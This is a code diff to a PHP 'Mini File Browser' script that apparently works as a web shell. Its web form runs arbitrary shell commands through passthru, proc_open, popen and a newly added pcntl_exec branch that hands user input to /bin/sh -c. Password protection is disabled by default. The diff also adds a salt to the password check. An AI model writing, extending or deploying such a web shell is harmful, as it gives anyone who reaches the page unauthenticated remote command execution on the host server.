@@ -1,5 +1,4 @@
 <?php
-
 /*
 $aging = 0 disables the auto remove functionality
 */
@@ -12,7 +11,7 @@ e.g.
 $pass = 'test:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'; //(test/test)
 */
 $pass = '';
-
+$salt = '';
 /*
 IP limit
 e.g.
@@ -23,7 +22,7 @@ $ips = '';
 
 /* authentification */
 if ($pass) {
-  if (empty($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER'] != explode(":", $pass) [0] || hash ( 'sha256' , $_SERVER['PHP_AUTH_PW']) != explode(":", $pass) [1]) {
+  if (empty($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER'] != explode(":", $pass) [0] || hash ( 'sha256' , $salt.$_SERVER['PHP_AUTH_PW']) != explode(":", $pass) [1]) {
     header('WWW-Authenticate: Basic realm="Mini File Browser"');
     header('HTTP/1.0 401 Unauthorized');
     die('unauthorized!');
@@ -152,7 +151,7 @@ function console()
   echo '<input type="radio" name="method" value="passthru"> passthru()<br>';
   echo '<input type="radio" name="method" value="proc_open"> proc_open()<br>';
   echo '<input type="radio" name="method" value="popen"> popen()<br>';
-  echo '<input type="radio" name="method" value="pcntl_exec"> pcntl_exec()<br>';      
+  echo '<input type="radio" name="method" value="pcntl_exec"> pcntl_exec() (/bin/sh -c cmd > outfile)<br>';      
   echo '<input name="command">';
   echo '<button type="submit">RUN</button>';
   echo '</form>';
@@ -185,11 +184,20 @@ function console()
         echo stream_get_contents($fp);
         fclose($fp);
         break;
-      }
       
-
+      case 'pcntl_exec':
+        header("Refresh:1");
+        pcntl_exec('/bin/sh',array('-c', $command.' > this_is_pcntl_exec_outfile.txt'));
+        break;
+      }
         
     echo '</pre><br>';
+  }
+  if(file_exists('this_is_pcntl_exec_outfile.txt')){
+    echo '<h3>Result:</h3><pre>';
+    echo file_get_contents('this_is_pcntl_exec_outfile.txt');
+    echo "</pre>";
+    unlink('this_is_pcntl_exec_outfile.txt');
   }
 
 }
